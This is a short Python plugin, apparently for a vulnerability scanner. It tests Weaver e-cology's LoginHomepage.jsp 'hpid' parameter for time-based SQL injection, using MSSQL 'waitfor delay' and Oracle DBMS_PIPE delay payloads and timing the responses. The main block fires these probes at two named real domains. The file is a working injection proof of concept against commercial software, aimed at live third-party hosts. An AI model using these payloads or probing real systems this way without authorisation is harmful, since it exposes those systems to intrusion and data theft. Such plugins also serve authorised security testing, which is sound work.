#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = e-cology homepage/LoginHomepage.jsp hpid sqli
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-078802

import re
import md5
import time

def assign(service, arg):
    if service == 'weaver_e-cology':
        return True, arg

def audit(arg):
    #MSSQL
    payload1 = "homepage/LoginHomepage.jsp?hpid=21%20waitfor%20delay%20'0:0:5'"
    payload2 = "homepage/LoginHomepage.jsp?hpid=21%20waitfor%20delay%20'0:0:0'"
    t1 = time.time()
    code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
    t2 = time.time()
    code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
    t3 = time.time()
    if (t2 - t1 - t3 + t2 > 3):
        security_hole(_1+' has injection(MSSQL)')
    #Oracle
    else:
        payload1 = "homepage/LoginHomepage.jsp?hpid=21%20and%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(199)||CHR(81)||CHR(109),5)"
        payload2 = "homepage/LoginHomepage.jsp?hpid=21%20and%201=1"
        t1 = time.time()
        code1, head1, res1, errcode1, _1 = curl.curl2(arg+payload1)
        t2 = time.time()
        code2, head2, res2, errcode2, _2 = curl.curl2(arg+payload2) 
        t3 = time.time()
        if (t2 - t1 - t3 + t2 > 3):
            security_hole(_1+' has injection(Oracle)')

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_e-cology', 'http://km.chinadrtv.com/')[1])
    audit(assign('weaver_e-cology', 'http://group.e-cology.cn/')[1])